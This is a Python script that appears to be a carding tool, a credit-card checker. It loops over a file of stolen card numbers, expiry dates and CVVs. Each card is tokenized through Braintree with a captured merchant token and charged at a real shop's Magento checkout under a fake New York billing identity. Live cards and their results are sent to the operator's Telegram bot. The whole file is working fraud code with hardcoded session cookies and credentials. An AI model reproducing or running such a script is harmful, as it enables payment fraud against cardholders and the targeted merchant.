try:
	import requests;import json
except:import os;os.system('pip install requests');os.system('pip install requests')

file=input('enter name combo: ');idtele=input('enter id telegram: ');tokentele=input('enter token bot: ');gg=open(file,'r');url = "https://www.reallytech.net/reallytech_2/checkout/cart/add/uenc/aHR0cHM6Ly93d3cucmVhbGx5dGVjaC5uZXQvcmVhbGx5dGVjaF8y/product/31213/";payload = "product=31213&uenc=aHR0cHM6Ly93d3cucmVhbGx5dGVjaC5uZXQvcmVhbGx5dGVjaF8y&form_key=wjfBCZ6djp4ysL5h";headers = {
  'User-Agent': "Mozilla/5.0 (Linux; Android 13; RMX3760 Build/TP1A.220624.014) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.99 Mobile Safari/537.36",
  'Accept': "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
  'Accept-Encoding': "gzip, deflate, br, zstd",
  'Content-Type': "application/x-www-form-urlencoded",
  'cache-control': "max-age=0",
  'sec-ch-ua': "\"Android WebView\";v=\"123\", \"Not:A-Brand\";v=\"8\", \"Chromium\";v=\"123\"",
  'sec-ch-ua-mobile': "?1",
  'sec-ch-ua-platform': "\"Android\"",
  'upgrade-insecure-requests': "1",
  'origin': "https://www.reallytech.net",
  'x-requested-with': "mark.via.gq",
  'sec-fetch-site': "same-origin",
  'sec-fetch-mode': "navigate",
  'sec-fetch-user': "?1",
  'sec-fetch-dest': "document",
  'referer': "https://www.reallytech.net/",
  'accept-language': "ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7",
  'Cookie': "form_key=wjfBCZ6djp4ysL5h; mage-cache-storage={}; mage-cache-storage-section-invalidation={}; mage-cache-sessid=true; mage-messages=; recently_viewed_product={}; recently_viewed_product_previous={}; recently_compared_product={}; recently_compared_product_previous={}; product_data_storage={}; section_data_ids={%22cart%22:null%2C%22directory-data%22:null%2C%22messages%22:null}"
};response = requests.post(url, data=payload, headers=headers);url = "https://www.reallytech.net/reallytech_2/checkout/";headers = {
  'User-Agent': "Mozilla/5.0 (Linux; Android 13; RMX3760 Build/TP1A.220624.014) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.99 Mobile Safari/537.36",
  'Accept': "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
  'Accept-Encoding': "gzip, deflate, br, zstd",
  'sec-ch-ua': "\"Android WebView\";v=\"123\", \"Not:A-Brand\";v=\"8\", \"Chromium\";v=\"123\"",
  'sec-ch-ua-mobile': "?1",
  'sec-ch-ua-platform': "\"Android\"",
  'upgrade-insecure-requests': "1",
  'dnt': "1",
  'x-requested-with': "mark.via.gq",
  'sec-fetch-site': "none",
  'sec-fetch-mode': "navigate",
  'sec-fetch-user': "?1",
  'sec-fetch-dest': "document",
  'referer': "https://www.reallytech.net/reallytech_2",
  'accept-language': "ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7",
  'Cookie': "form_key=wjfBCZ6djp4ysL5h; mage-cache-storage={}; mage-cache-storage-section-invalidation={}; recently_viewed_product={}; recently_viewed_product_previous={}; recently_compared_product={}; recently_compared_product_previous={}; product_data_storage={}; PHPSESSID=5c6804f1c92c8d609be682a6699d48c1; private_content_version=e716aeca656d5875b8be1fd9123c83e7; form_key=wjfBCZ6djp4ysL5h; mage-cache-sessid=true; mage-messages=; section_data_ids={%22cart%22:1713480204%2C%22directory-data%22:1713480204}"
};response = requests.get(url, headers=headers);order=(response.text.split('{"entity_id":')[1].split('"')[1])
for gg in gg:
	c = gg.strip().split('\n')[0]
	cc = c.split('|')[0]
	exp=c.split('|')[1]
	ex=c.split('|')[2]
	try:
		exy=ex[2]+ex[3]
		if '2' in ex[3] or '1' in ex[3]:
			exy=ex[2]+'7'
		else:pass
	except:
		exy=ex[0]+ex[1]
		if '2' in ex[1] or '1' in ex[1]:
			exy=ex[0]+'7'
		else:pass
	cvc=c.split('|')[3]

	url = "https://payments.braintree-api.com/graphql";payload = json.dumps({
	  "clientSdkMetadata": {
	    "source": "client",
	    "integration": "custom",
	    "sessionId": "0a29af0a-ce91-4594-9bee-fcb656bed1b7"
	  },
	  "query": "mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }",
	  "variables": {
	    "input": {
	      "creditCard": {
	        "number": cc,
	        "expirationMonth": exp,
	        "expirationYear": "20"+exy,
	        "cvv": cvc
	      },
	      "options": {
	        "validate": False
	      }
	    }
	  },
	  "operationName": "TokenizeCreditCard"
	});headers = {
	  'User-Agent': "Mozilla/5.0 (Linux; Android 13; RMX3760 Build/TP1A.220624.014) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.99 Mobile Safari/537.36",
	  'Accept-Encoding': "gzip, deflate, br, zstd",
	  'Content-Type': "application/json",
	  'sec-ch-ua': "\"Android WebView\";v=\"123\", \"Not:A-Brand\";v=\"8\", \"Chromium\";v=\"123\"",
	  'sec-ch-ua-mobile': "?1",
	  'authorization': "Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE3MTM1NjY2MjQsImp0aSI6ImMwNjZlMjAzLTI3OGItNGEwOC1hM2QyLWM3NzAxNTdiMjI1MyIsInN1YiI6Im5mdzM2eWZuaDNoemh6d2YiLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6Im5mdzM2eWZuaDNoemh6d2YiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0IjpmYWxzZX0sInJpZ2h0cyI6WyJtYW5hZ2VfdmF1bHQiXSwic2NvcGUiOlsiQnJhaW50cmVlOlZhdWx0Il0sIm9wdGlvbnMiOnt9fQ.bRbltlaJ03TI06hMcCXAVY59TfGwZ_UPT6nE61LpLMryF2AoSGV-ai3NLipdKYcdMv7e2WJ2q0ekXqdNRTntKA",
	  'braintree-version': "2018-05-10",
	  'sec-ch-ua-platform': "\"Android\"",
	  'origin': "https://assets.braintreegateway.com",
	  'x-requested-with': "mark.via.gq",
	  'sec-fetch-site': "cross-site",
	  'sec-fetch-mode': "cors",
	  'sec-fetch-dest': "empty",
	  'referer': "https://assets.braintreegateway.com/",
	  'accept-language': "ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7"
	};response = requests.post(url, data=payload, headers=headers);token=(response.json()["data"]["tokenizeCreditCard"]["token"]);url = f"https://www.reallytech.net/reallytech_2/rest/reallytech_2/V1/guest-carts/{order}/payment-information";payload = json.dumps({
	  "cartId": order,
	  "billingAddress": {
	    "countryId": "US",
	    "regionId": "43",
	    "regionCode": "NY",
	    "region": "New York",
	    "street": [
	      "new york",
	      "new york2",
	      "new york1"
	    ],
	    "company": "Mohamed Sarah",
	    "telephone": "2012345992",
	    "postcode": "10080",
	    "city": "new york",
	    "firstname": "Mohamed",
	    "lastname": "Sarah",
	    "saveInAddressBook": None
	  },
	  "paymentMethod": {
	    "method": "braintree",
	    "additional_data": {
	      "payment_method_nonce": token,
	      "device_data": "{\"correlation_id\":\"528daf7d2f856bca58f734dac8222f54\"}"
	    }
	  },
	  "email": "hellogyus@gmail.com"
	});headers = {
	  'User-Agent': "Mozilla/5.0 (Linux; Android 13; RMX3760 Build/TP1A.220624.014) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.99 Mobile Safari/537.36",
	  'Accept-Encoding': "gzip, deflate, br, zstd",
	  'Content-Type': "application/json",
	  'sec-ch-ua': "\"Android WebView\";v=\"123\", \"Not:A-Brand\";v=\"8\", \"Chromium\";v=\"123\"",
	  'x-requested-with': "XMLHttpRequest",
	  'sec-ch-ua-mobile': "?1",
	  'sec-ch-ua-platform': "\"Android\"",
	  'origin': "https://www.reallytech.net",
	  'sec-fetch-site': "same-origin",
	  'sec-fetch-mode': "cors",
	  'sec-fetch-dest': "empty",
	  'referer': "https://www.reallytech.net/reallytech_2/checkout/",
	  'accept-language': "ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7",
	  
	};response = requests.post(url, data=payload, headers=headers);msg=(response.text)
	if 'Payment method successfully added.' in msg or 'street address.' in msg or 'Gateway Rejected: avs' in msg or "Status code avs: Gateway Rejected: avs" in msg or "payment method added:" in msg or "Duplicate card exists in the vault." in msg or "Payment method successfully added." in msg or "Thank you for your purchase!" in msg or "Thank you for your" in msg:
		print(f"{c}|Charge ✅")
		requests.post(f"https://api.telegram.org/bot{tokentele}/sendMessage?chat_id={idtele}&parse_mode=HTML&text={c}|Charge ✅")
	elif 'Card Issuer Declined CVV' in msg:
		print(f"{c}|Declined CVV ❎")
		requests.post(f"https://api.telegram.org/bot{tokentele}/sendMessage?chat_id={idtele}&parse_mode=HTML&text={c}|Declined CVV ❎")
	elif 'Insufficient Funds' in msg:
		print(f"{c}|Insufficient Funds. ✅")
		requests.post(f"https://api.telegram.org/bot{tokentele}/sendMessage?chat_id={idtele}&parse_mode=HTML&text={c}|Insufficient Funds. ✅")
	else:
		try:
			print(f"{c}|{response.json()['message']}")
		except:print('UNK-RESPONSE')
		